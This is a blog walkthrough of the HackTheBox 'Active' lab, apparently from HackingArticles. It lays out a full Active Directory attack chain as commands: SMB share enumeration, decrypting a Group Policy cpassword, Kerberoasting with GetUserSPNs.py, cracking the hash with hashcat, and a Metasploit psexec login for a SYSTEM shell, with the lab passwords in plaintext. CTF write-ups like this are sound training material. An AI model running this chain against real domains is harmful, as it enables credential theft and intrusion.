@@ -1,0 +1,89 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Active Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-active-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-12-11T11:48:57+00:00">December 11, 2018</time><time class="updated" datetime="2025-07-04T17:29:49+00:00">July 4, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Active”. Active is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Easy</span></p>
+<p><span style="color: #000000;"><strong>Task: </strong>To find user.txt and root.txt file</span></p>
+<h3><span style="color: #800000;">Penetration Methodologies</span></h3>
+<p><span style="color: #000000;"><strong>Scanning Network</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Open ports and Running services (Nmap)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Identify share files (Linux4enum)</span></li>
+<li><span style="color: #000000;">Access share file via Anonymous login (smbclient)</span></li>
+<li><span style="color: #000000;">Decrypting cpassword (Gpprefdecrypt.py)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Access Victim’s Shell via SMB connect</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Access share file user login</span></li>
+<li><span style="color: #000000;">Get User.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Find Service Principal Names (<strong>py</strong>)</span></li>
+<li><span style="color: #000000;">Crack the hash (Hashcat)</span></li>
+<li><span style="color: #000000;">Psexec Exploit (Metasploit)</span></li>
+<li><span style="color: #000000;">Get root.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong><u>Walkthrough</u></strong></span></p>
+<h3><span style="color: #800000;">Scanning Network</span></h3>
+<p><span style="color: #000000;">Note: Since these labs are online available therefore they have a static IP. The IP of Active is 10.10.10.100</span></p>
+<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and services.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.10.10.100</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dnDjdZCe7Hk/XA-huvjSwRI/AAAAAAAAbrs/hxVCkBaw5pMHEtDhMEF7V0BOgLHfdnCuACLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">As you can observe from Nmap scanning result, there are so many open ports along with their running services, the OS is Microsoft Windows server 2008:r2:sp1 and you can also read the domain name “active.htb”.</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">I try eternal blue attack when I saw port 445 was open but I guess this was Patched version of SMB, therefore I have to start with enum4linux script. As we all know it is the best script for SMB enumeration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./enum4liux -S 10.10.10.100</pre>
+<p><span style="color: #000000;">It has shown anonymous login for /Replication share file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6NYnddCNXJ8/XA-hv7aplzI/AAAAAAAAbr4/NmNPKL8A4_cytSlmxj4zPLKMrkYUCAiiACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Then I try to access /Replication with the help smbclient and run the following command to access this directory via anonymous login:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient //10.10.10.100/Replication</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-CExPLGoLP5w/XA-hwH3cjXI/AAAAAAAAbr8/RwkVSMwcNqQ86aiXBeb6LgGOZckcbK-5ACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Here I downloaded Groups.xml file which I found from inside the following path:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">\active.htb\Policies\{31B2F340–016D-11D2–945F-00C04FB984F9}\MACHINE\Preferences\Groups\</pre>
+<p><span style="color: #000000;">So here I found <strong>cpassword</strong> attribute value embedded in the Groups.xml for user <strong>SVC_TGS</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iHqY36FKTZY/XA-hwbH0PTI/AAAAAAAAbsE/qb9Ps9fw-7AvwJHuZ1rPGZVUYMDfd2f-wCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Therefore I download a python script “Gpprefdecrypt” from GitHub to decrypt the password of local users added via Windows 2008 Group Policy Preferences (GPP) and obtain the password: <em>GPPstillStandingStrong2k18</em>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python Gpprefdecrypt.py &lt; cpassword attribute value &gt;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-K9d8NIeuCbI/XA-hwUCxoFI/AAAAAAAAbsA/ssJDj3eoKWc-T5RBvRuxEeFe_V_8a6mEQCLcBGAs/s1600/5.png"/></span></p>
+<h3><span style="color: #800000;">Access Victim’s Shell via SMB connect</span></h3>
+<p><span style="color: #000000;">Using the above credential we connect to SMB with the help of the following command and successfully able to catch our 1<sup>st</sup> flag “user.txt” file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient //10.10.10.100/Users -U SVC_TGS</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HL_Id7bfKzE/XA-hwwgBwHI/AAAAAAAAbsI/e0RvpZ1igbo3q41bjak3-DkPc9s5WldnQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Now, it’s time to hunt root.txt file and as always seen that for obtain root.txt file we need to escalate root privilege, therefore let’s add Host_IP and Host_name inside /etc/hosts file in our local machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2oRQ-3p3Qlo/XA-hxIKu-cI/AAAAAAAAbsQ/zER1m4jlfcEjHPUGA1EayqA6-BmAl_eewCLcBGAs/s1600/7.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">In nmap scanning result we saw port 88 was open for Kerberos, hence there must be some Service Principal Names (SPN) that are associated with the normal user account. Therefore we downloaded and install impacket from Github for using its python class <strong>GetUserSPN.py</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18</pre>
+<p><span style="color: #000000;">I copied the hash value into a text file “hash.txt” for its decryption.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-KGaDNmSAm9k/XA-hxEd4r3I/AAAAAAAAbsM/g0BJz6EY83EnMoBvCIzhJzIpK5yQq0TggCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Then with the help of hashcat, we find out the hash mode and as result, it showed <strong>13100</strong> for Kerberos 5 TGS-REP etype 23</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hashcat -h |grep -i tgs</pre>
+<p><span style="color: #000000;">Finally, it was time to crack the hashes and obtain the password by using rockyou.txt wordlist.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hashcat -m 13100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --force --show</pre>
+<p><span style="color: #000000;">Hurray!!! We got it, Ticketmaster1968 for the administrator.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-QzhxJqW15ao/XA-huoedgyI/AAAAAAAAbro/iBkNybKZJ_I35csgIbNqJXRJpOgydIv3QCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Without wasting time I load the Metasploit framework and run the following module to spawn full privilege system shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/windows/smb/psexec
+msf exploit windows/smb/psexec) &gt; set rhost 10.10.10.100
+msf exploit(windows/smb/psexec) &gt; set smbuser administrator
+msf exploit(windows/smb/psexec) &gt; set smbpass Ticketmaster1968
+msf exploit(windows/smb/psexec) &gt; exploit</pre>
+<p><span style="color: #000000;">BOOOMMM…………………</span></p>
+<p><span style="color: #000000;">Now we are inside the root shell, let’s chase towards root.txt file and finish this challenge.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-axCn2RU2x5c/XA-huvqLjaI/AAAAAAAAbrw/rxxeWtfAFYw_OdkaPxsNNHAXpXbwCGYUgCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Yuppieee! We found our 2<sup>nd</sup> flag the root.txt file from inside /Users/Administrator/Desktop.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EQvO6hoxWN8/XA-hvbJNxfI/AAAAAAAAbr0/KYIqruBleQYhEy7BAb2wYaFbKvcnreTCQCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
